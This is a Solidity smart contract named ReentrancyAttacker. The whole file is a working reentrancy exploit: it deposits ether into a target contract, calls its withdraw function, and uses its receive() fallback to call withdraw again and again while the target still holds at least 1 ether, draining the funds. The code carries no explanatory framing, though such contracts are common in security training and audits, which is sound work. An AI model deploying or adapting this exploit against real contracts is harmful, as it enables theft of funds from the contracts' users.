// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVictim {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {
    IVictim public victim;

    constructor(address _victim) {
        victim = IVictim(_victim);
    }

    function attack() external payable {
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdraw();
        }
    }
}
